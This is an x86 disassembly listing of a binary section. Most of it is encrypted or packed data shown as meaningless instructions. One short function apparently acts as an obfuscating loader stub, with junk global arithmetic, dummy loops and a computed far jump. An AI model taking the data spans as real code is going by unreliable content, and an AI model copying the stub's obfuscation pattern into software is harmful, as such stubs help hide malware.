  40578e:	sub    eax,ebp
  405790:	arpl   WORD PTR [eax+0x4a],bx
  405793:	mov    dh,0x88
  405795:	inc    edx
  405796:	mov    BYTE PTR [ecx],cl
  405798:	mov    ch,0x2a
  40579a:	aaa    
  40579b:	data16 icebp 
  40579d:	jbe    0x4057a3
  40579f:	int    0xdf
  4057a1:	popf   
  4057a2:	lods   al,BYTE PTR ds:[esi]
  4057a3:	jae    0x405798
  4057a5:	(bad)  
  4057a6:	ins    DWORD PTR es:[edi],dx
  4057a7:	cmc    
  4057a8:	repz inc edi
  4057aa:	outs   dx,DWORD PTR ds:[esi]
  4057ab:	xor    al,0x81
  4057ad:	mov    esp,0x877d3a9f
  4057b2:	retf   
  4057b3:	ss jle 0x4057b6
  4057b6:	rol    DWORD PTR [ebp-0x36a13857],cl
  4057bc:	stc    
  4057bd:	mov    ah,0xc6
  4057bf:	push   ss
  4057c0:	fwait
  4057c1:	and    DWORD PTR [ecx+0x5a6229ae],esi
  4057c7:	pop    ds
  4057c8:	xlat   BYTE PTR ds:[ebx]
  4057c9:	in     eax,dx
  4057ca:	mov    eax,ds:0xd0f516cc
  4057cf:	sbb    edi,DWORD PTR [edx]
  4057d1:	imul   edi,DWORD PTR [esi+0x6b456021],0x50
  4057d8:	inc    ebx
  4057d9:	fprem1 
  4057db:	outs   dx,BYTE PTR ds:[esi]
  4057dc:	dec    edi
  4057dd:	cdq    
  4057de:	lods   al,BYTE PTR ds:[esi]
  4057df:	loop   0x405851
  4057e1:	aam    0x67
  4057e3:	in     eax,0x12
  4057e5:	push   0x2d871ad0
  4057ea:	mov    WORD PTR [edi-0x6c401402],gs
  4057f0:	out    dx,al
  4057f1:	mov    ah,0x73
  4057f3:	add    al,0x61
  4057f5:	dec    esi
  4057f6:	inc    esi
  4057f7:	jmp    0x5749:0x17466188
  4057fe:	mov    bl,0xbb
  405800:	repz push esp
  405802:	xchg   edx,eax
  405803:	and    BYTE PTR [ebx+0x4c],bl
  405806:	test   BYTE PTR [ebp-0x6a0558e4],ah
  40580c:	leave  
  40580d:	std    
  40580e:	xchg   esi,eax
  40580f:	iret   
  405810:	int3   
  405811:	mov    esi,DWORD PTR [edx-0x5301acaf]
  405817:	neg    bh
  405819:	mov    di,0xf775
  40581d:	leave  
  40581e:	sbb    al,0xc6
  405820:	xor    ch,BYTE PTR [edx+ebp*1+0x19]
  405824:	pop    es
  405825:	(bad)  
  405826:	xor    ecx,DWORD PTR ds:[edi-0x501be3cc]
  40582d:	mov    DWORD PTR [eax+0x23],ecx
  405830:	enter  0xccd3,0xb5
  405834:	xchg   BYTE PTR [ebx-0x3e5173d8],dl
  40583a:	jl     0x405808
  40583c:	xlat   BYTE PTR ds:[ebx]
  40583d:	test   BYTE PTR [edi-0x1d7f2249],0x3e
  405844:	dec    ecx
  405845:	xchg   esp,eax
  405846:	push   ds
  405847:	cdq    
  405848:	(bad)  
  405849:	sbb    bl,ch
  40584b:	xor    BYTE PTR [ecx+0x3e60f9d5],ah
  405851:	fdivp  st(0),st
  405853:	cmp    DWORD PTR [ebp-0x23f25fd6],ebx
  405859:	jae    0x405818
  40585b:	inc    ebp
  40585c:	das    
  40585d:	fcom   DWORD PTR [ebp+0x358070e9]
  405863:	mov    cl,BYTE PTR [edx]
  405865:	in     al,0x7
  405867:	mov    ah,0xb3
  405869:	jmp    0xd0f7faae
  40586e:	push   eax
  40586f:	call   0x693b:0x59400419
  405876:	pop    edi
  405878:	inc    ebp
  405879:	and    DWORD PTR [edi],eax
  40587b:	jp     0x405877
  40587d:	cmp    al,0x49
  40587f:	scas   al,BYTE PTR es:[edi]
  405880:	xchg   DWORD PTR [edi+0x22],ebx
  405883:	push   ds
  405884:	add    BYTE PTR [eax+edx*4-0x7290c4b],0xa3
  40588c:	jns    0x40584f
  40588e:	jno    0x405883
  405890:	neg    DWORD PTR [esi-0x44]
  405893:	mov    al,ds:0xffdd461a
  405898:	inc    eax
  405899:	fcom   QWORD PTR [ebx-0x39]
  40589c:	cdq    
  40589d:	ret    
  40589e:	pop    esp
  40589f:	jge    0x40587c
  4058a1:	sub    al,0xb7
  4058a3:	mov    edx,0x5514b894
  4058a8:	fst    st(1)
  4058aa:	mov    cl,BYTE PTR [ecx-0x5d]
  4058ad:	mov    eax,ds:0x1915f8e4
  4058b2:	jp     0x40583c
  4058b4:	int    0xb3
  4058b6:	or     esp,DWORD PTR [eax]
  4058b8:	sub    BYTE PTR [ebx-0x27],al
  4058bb:	scas   al,BYTE PTR es:[edi]
  4058bc:	adc    al,0xa7
  4058be:	cmc    
  4058bf:	ss fwait
  4058c1:	mov    al,BYTE PTR [ebx+ebp*4+0x8]
  4058c5:	push   ds
  4058c6:	sub    DWORD PTR [esi-0x179b9142],edi
  4058cc:	mov    bl,0x14
  4058ce:	rcl    DWORD PTR [eax+0x3249a002],cl
  4058d4:	push   0x55421e95
  4058d9:	push   cs
  4058da:	(bad)  
  4058dc:	(bad)  
  4058dd:	cld    
  4058de:	popf   
  4058df:	cmp    al,0xdf
  4058e1:	jbe    0x4058dc
  4058e3:	cmp    DWORD PTR [edi-0x6681b61e],esi
  4058e9:	xchg   ebp,eax
  4058ea:	mul    BYTE PTR [edx]
  4058ec:	jg     0x40596b
  4058ee:	int    0x1a
  4058f0:	cmc    
  4058f1:	das    
  4058f2:	lods   eax,DWORD PTR ds:[esi]
  4058f3:	jno    0x405889
  4058f5:	push   ds
  4058f6:	adc    DWORD PTR ds:[esi+0x13682834],esp
  4058fd:	pop    eax
  4058fe:	je     0x405913
  405900:	inc    edi
  405901:	inc    eax
  405902:	aad    0xe
  405904:	inc    eax
  405905:	ins    DWORD PTR es:[edi],dx
  405906:	std    
  405907:	shr    edx,cl
  405909:	pop    ds
  40590a:	xor    bh,BYTE PTR [edx-0x73]
  40590d:	ins    BYTE PTR es:[edi],dx
  40590e:	push   0x6a066e37
  405913:	mov    ds:0x45ff928b,eax
  405918:	pop    edx
  405919:	data16 cmc 
  40591b:	inc    ebx
  40591c:	jge    0x405942
  40591e:	xchg   ah,bl
  405920:	or     al,ah
  405922:	std    
  405923:	dec    ebx
  405924:	aad    0x2d
  405926:	jmp    0xc147:0x9e3b05df
  40592d:	jg     0x4058ce
  40592f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405930:	push   cs
  405931:	(bad)  
  405932:	(bad)  
  405933:	stos   DWORD PTR es:[edi],eax
  405934:	cmp    dh,bl
  405936:	pop    edi
  405937:	jno    0x4059a0
  405939:	jno    0x40596e
  40593b:	sbb    bl,BYTE PTR [eax+0x48]
  40593e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40593f:	mov    DWORD PTR [edi-0x419b9a88],ebp
  405945:	pop    esp
  405946:	call   0x4ae5693f
  40594b:	inc    eax
  40594c:	jae    0x405922
  40594e:	xor    eax,0xfb557cd2
  405953:	enter  0x40b4,0xd1
  405957:	xor    edx,0x931dbd39
  40595d:	(bad)  [eax+0x3e35dea7]
  405963:	imul   ebx,DWORD PTR [edx+ebx*8-0x4a43657d],0x13
  40596b:	mov    ebx,DWORD PTR [eax]
  40596d:	stos   DWORD PTR es:[di],eax
  40596f:	ret    0xa4d6
  405972:	aaa    
  405973:	pop    es
  405974:	retf   
  405975:	fldcw  WORD PTR ds:0x6b8e226
  40597b:	or     ah,ah
  40597d:	inc    esi
  40597e:	add    dl,BYTE PTR [ebx-0x74]
  405981:	imul   edi,DWORD PTR [edi-0x5c],0xffffffba
  405985:	mov    cl,0x9b
  405987:	mov    dl,BYTE PTR [ebx+0x15]
  40598a:	push   esi
  40598b:	aam    0xe7
  40598d:	pop    ecx
  40598e:	(bad)  
  40598f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405990:	arpl   WORD PTR [esi-0x79],bx
  405993:	adc    BYTE PTR [ebx-0x54],0x32
  405997:	imul   esp,DWORD PTR [edx-0x7aadb1dc],0xb275d981
  4059a1:	mov    eax,0x170fafd5
  4059a6:	dec    ecx
  4059a7:	test   BYTE PTR [edi+eiz*1+0x3e],ah
  4059ab:	mov    cl,0x96
  4059ad:	repnz int 0x9e
  4059b0:	lods   al,BYTE PTR ds:[esi]
  4059b1:	into   
  4059b2:	or     eax,ecx
  4059b4:	mov    bh,0x11
  4059b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059b7:	leave  
  4059b8:	das    
  4059b9:	test   eax,0x449f8ec
  4059be:	inc    ebp
  4059bf:	repz fimul WORD PTR [esi]
  4059c2:	in     al,dx
  4059c3:	and    DWORD PTR [edi],edi
  4059c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c6:	dec    edx
  4059c7:	hlt    
  4059c8:	pusha  
  4059c9:	mov    ecx,DWORD PTR [edx+ebp*8-0xdfa2147]
  4059d0:	xchg   edi,eax
  4059d1:	nop
  4059d2:	push   ecx
  4059d3:	or     ebx,ecx
  4059d5:	cld    
  4059d6:	pop    ds
  4059d7:	test   ebx,ecx
  4059d9:	sbb    dl,BYTE PTR [edi-0xf]
  4059dc:	push   esp
  4059dd:	add    al,bh
  4059df:	ins    DWORD PTR es:[edi],dx
  4059e0:	or     edx,DWORD PTR [esi+0x4e023fc3]
  4059e6:	and    edi,esi
  4059e8:	push   edi
  4059e9:	cmp    dh,bl
  4059eb:	and    edx,DWORD PTR [edi]
  4059ed:	fdivrp st(5),st
  4059ef:	and    ecx,DWORD PTR [ebx]
  4059f1:	xor    bh,ch
  4059f3:	xchg   BYTE PTR [ebx],cl
  4059f5:	aaa    
  4059f6:	pop    ebp
  4059f7:	imul   esp,DWORD PTR cs:[esi-0x3233132f],0xa8daa0a0
  405a02:	leave  
  405a03:	(bad)  
  405a04:	bswap  ebp
  405a06:	lock popf 
  405a08:	inc    ecx
  405a09:	fs das 
  405a0b:	sbb    eax,0x2b40b987
  405a10:	xor    al,0x1f
  405a12:	push   ss
  405a13:	xlat   BYTE PTR ds:[ebx]
  405a14:	xor    BYTE PTR [ebp-0x496ae7b2],dl
  405a1a:	pop    DWORD PTR [ebx-0xea6c3ed]
  405a20:	loopne 0x4059bb
  405a22:	in     al,dx
  405a23:	popa   
  405a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a25:	jle    0x405a40
  405a27:	jecxz  0x405a41
  405a29:	lock mov cl,0xdd
  405a2c:	xchg   edi,eax
  405a2d:	cmp    dh,BYTE PTR [eax-0x1e]
  405a30:	cmova  eax,DWORD PTR [esi+0x52836692]
  405a37:	xlat   BYTE PTR ds:[ebx]
  405a38:	(bad)  
  405a39:	fst    QWORD PTR [ecx+0x35070a6c]
  405a3f:	rep stos BYTE PTR es:[edi],al
  405a41:	push   ebx
  405a42:	push   ss
  405a43:	xchg   esi,eax
  405a44:	cmp    eax,0x8000ea53
  405a49:	lea    edx,[ebx]
  405a4b:	ins    DWORD PTR es:[edi],dx
  405a4c:	sub    edx,ebx
  405a4e:	mov    esp,0x58c20e05
  405a53:	sub    BYTE PTR [ebx+0x6a],bl
  405a56:	push   es
  405a57:	in     eax,dx
  405a58:	lea    ebp,[edx]
  405a5a:	pop    ebx
  405a5b:	loop   0x4059e4
  405a5d:	js     0x405a56
  405a5f:	in     eax,0xc7
  405a61:	xor    DWORD PTR [eax-0x7],ebp
  405a64:	lods   al,BYTE PTR ds:[esi]
  405a65:	int3   
  405a66:	add    eax,0x2b775351
  405a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a6c:	call   0xed41:0xd6bbc0a6
  405a73:	mov    esp,0xb913b97d
  405a78:	sbb    dh,ch
  405a7a:	adc    bl,ah
  405a7c:	sbb    edx,DWORD PTR [edi+0x7f]
  405a7f:	mov    bl,0x70
  405a81:	mov    esi,0xe90765e9
  405a86:	mov    eax,ds:0x4d8fc6e9
  405a8b:	fdiv   QWORD PTR [edi+0xb]
  405a8e:	in     al,0x3c
  405a90:	repz shr BYTE PTR [eax-0x423656f6],0x84
  405a98:	inc    ecx
  405a99:	mov    edi,0xf7557619
  405a9e:	cmp    ebx,ebp
  405aa0:	sub    cl,BYTE PTR [edi]
  405aa2:	jecxz  0x405a4b
  405aa4:	fwait
  405aa5:	jle    0x405ad0
  405aa7:	sti    
  405aa8:	mov    bh,0x6
  405aaa:	cwde   
  405aab:	push   esp
  405aac:	pop    esi
  405aad:	push   ds
  405aae:	fild   DWORD PTR [ebx-0x24553944]
  405ab4:	mov    edx,0xb38fa72b
  405ab9:	(bad)  
  405aba:	cmp    DWORD PTR [ecx-0x5d541ffb],eax
  405ac0:	cmc    
  405ac1:	inc    esp
  405ac2:	fist   DWORD PTR [esi+ebp*4+0x3]
  405ac6:	jle    0x405a76
  405ac8:	sub    DWORD PTR [edx],edx
  405aca:	inc    edi
  405acb:	ins    BYTE PTR es:[edi],dx
  405acc:	dec    edx
  405acd:	adc    eax,0xc42aa64e
  405ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad3:	inc    eax
  405ad4:	xchg   DWORD PTR [eax+eiz*2+0x34],esp
  405ad8:	mov    esp,0x8eeb5f31
  405add:	sbb    al,0x82
  405adf:	test   al,0x3a
  405ae1:	inc    ebp
  405ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ae3:	jg     0x405a84
  405ae5:	push   esi
  405ae7:	xor    al,0xfd
  405ae9:	add    al,0x11
  405aeb:	sub    BYTE PTR [ecx],bl
  405aed:	mov    ds:0x40f7f8d6,eax
  405af2:	push   esi
  405af3:	xor    al,0xf
  405af5:	mov    eax,ds:0xadbace0f
  405afa:	out    dx,eax
  405afb:	jg     0x405ac2
  405afd:	pusha  
  405afe:	adc    al,0x56
  405b00:	push   ecx
  405b01:	pop    ebp
  405b02:	daa    
  405b03:	jno    0x405b27
  405b05:	mov    ah,0x96
  405b07:	adc    bh,0x7d
  405b0a:	(bad)  
  405b0b:	push   edi
  405b0c:	mov    edi,DWORD PTR [ebx]
  405b0e:	push   esi
  405b0f:	dec    ecx
  405b10:	xchg   ebx,eax
  405b11:	ret    
  405b12:	(bad)  [esi+esi*8-0x2b]
  405b16:	cmp    bh,BYTE PTR [edx+eax*2+0x4ec1b897]
  405b1d:	repz js 0x405ad0
  405b20:	push   eax
  405b21:	pop    ebp
  405b22:	gs (bad) 
  405b24:	dec    ebp
  405b25:	shl    BYTE PTR [ebx+0x36],1
  405b28:	xor    eax,0x402d2793
  405b2d:	push   eax
  405b2e:	imul   edi,DWORD PTR [edx-0x46],0xffffffea
  405b32:	cwde   
  405b33:	xchg   edx,eax
  405b34:	inc    eax
  405b35:	bound  edx,QWORD PTR [esi+0x59]
  405b38:	inc    esp
  405b39:	fild   QWORD PTR [ecx+0x43]
  405b3c:	scas   eax,DWORD PTR es:[edi]
  405b3d:	mov    ds:0x4f8ba8c6,al
  405b42:	jns    0x405ac7
  405b44:	aaa    
  405b45:	dec    esp
  405b46:	fsubr  DWORD PTR [ebp-0x18]
  405b49:	mov    esi,ebx
  405b4b:	inc    esi
  405b4c:	imul   esp,DWORD PTR [edx-0x4d],0xffffffe1
  405b50:	arpl   WORD PTR [edx+ecx*4+0x5f466adb],cx
  405b57:	sar    DWORD PTR [eax+0x39],1
  405b5a:	imul   ebx,DWORD PTR [esi],0x86f6e246
  405b60:	ret    0xdb09
  405b63:	minps  xmm3,XMMWORD PTR [ebx]
  405b66:	inc    DWORD PTR [eax-0x2b]
  405b69:	mov    BYTE PTR [edi],bl
  405b6b:	leave  
  405b6c:	fwait
  405b6d:	xor    DWORD PTR [edi],edi
  405b6f:	sbb    edi,esp
  405b71:	mov    al,ds:0xc3b5c831
  405b76:	fcom   DWORD PTR [ecx+0x70]
  405b79:	clc    
  405b7a:	scas   eax,DWORD PTR es:[edi]
  405b7b:	retf   
  405b7c:	mov    cl,0x9b
  405b7e:	pop    esp
  405b7f:	scas   eax,DWORD PTR es:[edi]
  405b80:	and    ah,al
  405b82:	mov    BYTE PTR [esi+ebx*1+0x1e6f3215],ch
  405b89:	mov    ebx,0xbb7002d3
  405b8e:	pop    es
  405b8f:	fcomip st,st(1)
  405b91:	push   cs
  405b92:	push   cs
  405b93:	cli    
  405b94:	pop    ebx
  405b95:	fisttp DWORD PTR [ecx]
  405b97:	pusha  
  405b98:	mov    eax,ds:0x637d2c1c
  405b9d:	add    dh,BYTE PTR [esi-0x12884aa6]
  405ba3:	cmp    eax,0xebba22d2
  405ba8:	imul   DWORD PTR [eax+esi*2+0x7d]
  405bac:	loope  0x405bdd
  405bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405baf:	lock inc ecx
  405bb1:	lock mov dl,0x86
  405bb4:	rcl    ch,cl
  405bb6:	imul   ebx,DWORD PTR [edi-0x6960519a],0x61
  405bbd:	imul   ebx,ebp,0x510e0c6a
  405bc3:	in     eax,0x41
  405bc5:	jnp    0x405bb6
  405bc7:	icebp  
  405bc8:	aad    0xc7
  405bca:	xor    bl,BYTE PTR [ecx]
  405bcc:	or     DWORD PTR [edx],eax
  405bce:	or     edx,esp
  405bd0:	fbld   TBYTE PTR [ebp+0x36]
  405bd3:	or     BYTE PTR [edi],cl
  405bd5:	xor    BYTE PTR [edx+esi*4],ah
  405bd8:	fcomp  DWORD PTR [eax-0x67]
  405bdb:	adc    DWORD PTR [ebx+0x3b],esp
  405bde:	outs   dx,DWORD PTR ds:[esi]
  405bdf:	addr16 dec ebp
  405be1:	sbb    DWORD PTR [esi-0x6],ebx
  405be4:	and    edi,esi
  405be6:	aam    0xf
  405be8:	dec    esp
  405be9:	mov    ah,0xd8
  405beb:	push   ebp
  405bec:	xor    eax,DWORD PTR [eax-0x7c]
  405bef:	xor    eax,0xa59f44a3
  405bf4:	das    
  405bf5:	add    eax,0x1957c0c4
  405bfa:	xchg   ebp,eax
  405bfb:	pop    ebx
  405bfc:	xor    eax,DWORD PTR [esp+eiz*4]
  405bff:	dec    eax
  405c00:	ja     0x405b85
  405c02:	pop    eax
  405c03:	and    al,0x50
  405c05:	push   edx
  405c06:	adc    DWORD PTR [ecx-0x54bbf804],ebp
  405c0c:	inc    esi
  405c0d:	add    eax,0x803c1cee
  405c12:	ins    BYTE PTR es:[edi],dx
  405c13:	mov    al,ds:0x479437e5
  405c18:	push   edx
  405c19:	mov    ecx,0xd167664e
  405c1e:	aas    
  405c1f:	popa   
  405c20:	stos   BYTE PTR es:[edi],al
  405c21:	(bad)  
  405c22:	fwait
  405c23:	mov    ah,0x7d
  405c25:	mov    dl,0x6d
  405c27:	cwde   
  405c28:	xchg   edx,eax
  405c29:	jge    0x405c83
  405c2b:	into   
  405c2c:	dec    edx
  405c2d:	out    dx,al
  405c2e:	sbb    cl,ah
  405c30:	mov    ecx,0xf6352aa7
  405c35:	cmp    DWORD PTR [edi-0x61],edx
  405c38:	ins    DWORD PTR es:[edi],dx
  405c39:	add    ebx,DWORD PTR [eax-0x69ecb646]
  405c3f:	mov    al,0x37
  405c41:	inc    edi
  405c42:	sub    eax,0x96f2bcb9
  405c47:	hlt    
  405c48:	in     al,dx
  405c49:	fwait
  405c4a:	jle    0x405cbd
  405c4c:	into   
  405c4d:	and    eax,0xccbee2b2
  405c52:	push   ebx
  405c53:	sti    
  405c54:	(bad)  
  405c55:	leave  
  405c56:	and    al,0x6
  405c58:	add    BYTE PTR [ebx+0x15],bh
  405c5b:	mov    ebx,0x3f04753c
  405c60:	cli    
  405c61:	gs stos DWORD PTR es:[edi],eax
  405c63:	jmp    0x405c06
  405c65:	not    DWORD PTR [eax+ecx*1]
  405c68:	loopne 0x405c74
  405c6a:	sub    DWORD PTR [edi+0x5e],ebx
  405c6d:	leave  
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423523
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx-0x2c7a2557]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	(bad)  
  405e12:	cmp    al,BYTE PTR [ecx]
  405e14:	stos   BYTE PTR es:[edi],al
  405e15:	and    ebx,DWORD PTR [esi+0x7a]
  405e18:	adc    dl,BYTE PTR [ebp+0x62a5c0c9]
  405e1e:	xor    dh,BYTE PTR [esi]
  405e20:	lahf   
  405e21:	cmp    dl,BYTE PTR [ecx]
  405e23:	clc    
  405e24:	mov    fs,WORD PTR [ebx+0x72682c3f]
  405e2a:	or     DWORD PTR [esi+0x39],esp
  405e2d:	push   ds
  405e2e:	xor    DWORD PTR [ecx],esp
  405e30:	fs pop es
  405e32:	sub    bl,BYTE PTR [ebx+0x46]
  405e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e36:	(bad)  
  405e37:	in     al,dx
  405e38:	ret    
  405e39:	or     edx,0x7c1034ce
  405e3f:	fadd   DWORD PTR [esi+0x7f1482fb]
  405e45:	cmp    DWORD PTR [edx-0x68],ebx
  405e48:	sahf   
  405e49:	pop    edi
  405e4a:	stos   BYTE PTR es:[edi],al
  405e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4c:	dec    ebp
  405e4d:	outs   dx,BYTE PTR ds:[esi]
  405e4e:	push   esp
  405e4f:	dec    edi
  405e50:	stos   BYTE PTR es:[edi],al
  405e51:	push   di
  405e53:	pop    eax
  405e54:	outs   dx,BYTE PTR ds:[esi]
  405e55:	sub    esp,esp
  405e57:	adc    ch,BYTE PTR [ebx]
  405e59:	imul   edi,DWORD PTR ds:0xd47d7071,0x32
  405e60:	jae    0x405e7e
  405e62:	pop    ecx
  405e63:	jle    0x405e41
  405e65:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  405e67:	jmp    0xcdcae801
  405e6c:	add    eax,0xc5d7367e
  405e71:	shl    BYTE PTR ds:0x1b3634e0,1
  405e77:	cmp    DWORD PTR [ecx],0xc0013603
  405e7d:	push   eax
  405e7e:	(bad)  
  405e7f:	mov    al,0x64
  405e81:	popa   
  405e82:	push   ecx
  405e83:	rcr    BYTE PTR ds:0x9b983ca1,cl
  405e89:	add    BYTE PTR [ebx+0x55],al
  405e8c:	mov    bl,0xeb
  405e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e8f:	cmp    al,al
  405e91:	daa    
  405e92:	(bad)  
  405e93:	in     al,0xc7
  405e95:	and    DWORD PTR [esi],edx
  405e97:	dec    ebp
  405e98:	jmp    0x405ebe
  405e9a:	ror    dl,1
  405e9c:	cdq    
  405e9d:	(bad)  
  405e9e:	retf   0x1edc
  405ea1:	std    
  405ea2:	pop    ds
  405ea3:	add    BYTE PTR [ecx-0x2a814f0e],bl
  405ea9:	or     BYTE PTR [ecx+0x65b481fd],dh
  405eaf:	call   0x32fa7f96
  405eb4:	sbb    bl,BYTE PTR [edi+0x775fe79d]
  405eba:	das    
  405ebb:	dec    ecx
  405ebc:	inc    eax
  405ebd:	xor    al,0x0
  405ebf:	outs   dx,DWORD PTR ds:[esi]
  405ec0:	ins    DWORD PTR es:[edi],dx
  405ec1:	ficomp DWORD PTR ds:0xee77fc04
  405ec7:	mov    ah,0x9
  405ec9:	sti    
  405eca:	push   ebp
  405ecb:	lock sti 
  405ecd:	sti    
  405ece:	enter  0xd488,0x64
  405ed2:	in     al,0x6c
  405ed4:	sub    DWORD PTR [esi],ebx
  405ed6:	test   BYTE PTR [ebp-0x719cef31],0x22
  405edd:	test   eax,0xe053d93e
  405ee2:	cmp    ah,BYTE PTR [eax-0x7e]
  405ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee6:	scas   eax,DWORD PTR es:[edi]
  405ee7:	mov    dh,0x29
  405eea:	xor    DWORD PTR [ebp+0x3a3e82c],0x5d
  405ef1:	fwait
  405ef2:	adc    al,0x75
  405ef4:	shl    bl,1
  405ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ef7:	sub    BYTE PTR [edx+0x5f84eeba],dh
  405efd:	push   0x16
  405eff:	mov    WORD PTR [eax],gs
  405f01:	push   0xffffffaa
  405f03:	imul   esi,DWORD PTR [ecx],0x8bb564a9
  405f09:	(bad)  
  405f0a:	jo     0x405e9e
  405f0c:	shr    BYTE PTR [ebp+ebp*8+0x1e],1
  405f10:	xchg   esp,eax
  405f11:	push   ecx
  405f12:	or     bl,BYTE PTR ds:[edi+eiz*8+0x3c]
  405f17:	mov    ah,0x16
  405f19:	(bad)  
  405f1a:	or     DWORD PTR [eax-0x13],esp
  405f1d:	in     eax,dx
  405f1e:	(bad)  [ebp-0x1]
  405f21:	inc    esp
  405f22:	not    BYTE PTR [edx+esi*1-0x51]
  405f26:	(bad)  
  405f27:	out    0xa1,eax
  405f29:	scas   eax,DWORD PTR es:[edi]
  405f2a:	jecxz  0x405f5f
  405f2c:	adc    al,BYTE PTR [ebp+0x34994b44]
  405f32:	out    0xf9,eax
  405f34:	or     DWORD PTR [esi-0x58],ebp
  405f37:	or     eax,0x59b40907
  405f3c:	adc    eax,0x396d9be5
  405f41:	mov    bh,0xc2
  405f43:	std    
  405f44:	or     dh,BYTE PTR [ebp+0x2f]
  405f47:	outs   dx,BYTE PTR ds:[esi]
  405f48:	les    ebp,FWORD PTR [eax+0x2b]
  405f4b:	or     eax,edi
  405f4d:	int3   
  405f4e:	in     eax,dx
  405f4f:	xchg   edi,eax
  405f50:	in     al,0xdf
  405f52:	mov    fs,WORD PTR ds:0xd930a471
  405f58:	adc    al,0x3c
  405f5a:	lods   eax,DWORD PTR ds:[esi]
  405f5b:	nop
  405f5c:	mov    ah,0xf3
  405f5e:	or     ecx,ecx
  405f60:	(bad)  
  405f61:	es ins DWORD PTR es:[edi],dx
  405f63:	or     DWORD PTR [ebx],ebp
  405f65:	jle    0x405fdb
  405f67:	fidivr DWORD PTR [eax-0x5828f366]
  405f6d:	imul   ecx,DWORD PTR [ecx+0x65a980b3],0xffffffce
  405f74:	dec    esi
  405f75:	inc    eax
  405f76:	cdq    
  405f77:	lock and ah,BYTE PTR [ebx-0x12]
  405f7b:	sar    DWORD PTR [esi-0x238c292b],0x4f
  405f82:	arpl   WORD PTR [ebx],ax
  405f84:	int    0x6d
  405f86:	inc    eax
  405f87:	pop    esi
  405f88:	push   cs
  405f89:	dec    edi
  405f8a:	sbb    BYTE PTR [ebp+0x8],al
